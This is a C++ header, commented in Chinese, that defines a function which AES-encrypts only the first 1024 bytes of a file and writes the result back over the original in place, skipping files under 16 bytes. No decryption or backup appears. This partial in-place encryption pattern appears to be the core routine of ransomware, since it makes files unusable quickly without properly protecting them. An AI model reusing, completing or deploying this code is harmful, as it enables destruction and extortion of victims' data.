#pragma once
#include <fstream>
#include <string>
#include "var.h"
#include "aes.h"
using std::string;
using std::ios;
using std::ifstream;
using std::fstream;
/*加密一个文件*/
void fileEncryptFunc(string FilePath)
{
	ifstream f_in(FilePath.c_str(), ios::in | ios::binary);
	char input_buf[1024];
	char output_buf[1024];
	unsigned long long FileSize = 0; //文件大小
	int temp = 0;

	f_in.seekg(0, ios::end);
	FileSize = f_in.tellg(); //获取大小
	f_in.seekg(0, ios::beg);
	if (FileSize < 1024 && FileSize >= 16)
	{
		temp = FileSize / 16;
		temp = temp * 16;
		f_in.read(input_buf, temp);
		AesEn((unsigned char*)input_buf, (unsigned char*)output_buf, temp);
	}
	else if (FileSize >= 1024)
	{
		f_in.read(input_buf, 1024);
		AesEn((unsigned char*)input_buf, (unsigned char*)output_buf, 1024);
		temp = 1024;
	}
	else //跳过16字节以下(128位以下)的文件
	{
		return;
	}
	f_in.close();
	//rename(inputFilePath.c_str(), outputFilePath.c_str());
	fstream f_out(FilePath.c_str(), ios::out | ios::in | ios::binary);
	f_out.write(output_buf, temp);
	f_out.close();
}